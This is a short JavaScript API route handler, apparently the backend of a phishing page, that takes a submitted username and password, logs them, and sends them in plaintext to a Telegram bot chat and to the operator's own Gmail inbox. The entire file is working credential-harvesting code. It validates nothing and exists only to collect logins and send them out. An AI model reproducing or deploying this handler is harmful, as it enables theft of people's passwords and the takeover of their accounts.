import nodemailer from 'nodemailer';

export default async function handler(req, res) {
  if (req.method !== 'POST') {
    return res.status(405).json({ message: 'Method Not Allowed' });
  }

  const { inputValue, password } = req.body;
  console.log('Input Value:', inputValue);
  console.log('Password:', password);

  if (!inputValue || !password) {
    return res.status(400).json({ message: 'Input value and password are required' });
  }

  try {
    // Send to Telegram
    const telegramBotToken = process.env.TELEGRAM_BOT_TOKEN;
    const chatId = process.env.TELEGRAM_BOT_CHAT_ID;
    const telegramUrl = `https://api.telegram.org/bot${telegramBotToken}/sendMessage`;

    const telegramResponse = await fetch(telegramUrl, {
      method: 'POST',
      headers: { 'Content-Type': 'application/json' },
      body: JSON.stringify({ 
        chat_id: chatId, 
        text: `New submission:\nUsername: ${inputValue}\nPassword: ${password}` 
      }),
    });

    if (!telegramResponse.ok) {
      throw new Error('Failed to send Telegram message');
    }

    // Send Email
    const transporter = nodemailer.createTransport({
      host: 'smtp.gmail.com',
      port: 465,
      secure: true, // TLS
      auth: {
        user: process.env.EMAIL_SERVICE_USER,
        pass: process.env.EMAIL_SERVICE_PASS,
      },
    });

    await transporter.sendMail({
      from: process.env.EMAIL_SERVICE_USER,
      to: process.env.EMAIL_SERVICE_USER,
      subject: 'New Submission',
      text: `New submission:\nUsername: ${inputValue}\nPassword: ${password}`,
    });

    return res.status(200).json({ message: 'Data submitted successfully' });
  } catch (error) {
    console.error('Error:', error);
    return res.status(500).json({ message: 'Something went wrong', error });
  }
}
